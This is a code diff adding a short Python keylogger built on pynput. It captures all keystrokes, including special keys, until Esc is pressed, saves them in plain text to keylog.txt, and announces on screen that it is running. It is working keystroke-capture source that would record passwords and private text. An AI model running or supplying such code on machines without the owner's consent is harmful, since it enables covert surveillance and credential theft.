@@ -1,0 +1,33 @@
+from pynput import keyboard
+
+# Global variable to store keystrokes
+log = ""
+
+def on_press(key):
+    global log
+    try:
+        log += f"{key.char}"
+    except AttributeError:
+        # Handle special keys (e.g., Enter, Shift, etc.)
+        log += f" [{key}] "
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener on pressing Esc key
+        return False
+
+def main():
+    print("Keylogger is running. Press 'Esc' to stop and save the log.")
+
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    # Save log to a file
+    with open("keylog.txt", "w") as file:
+        file.write(log)
+
+    print(f"Keystrokes logged and saved to 'keylog.txt'.")
+
+if __name__ == "__main__":
+    main()
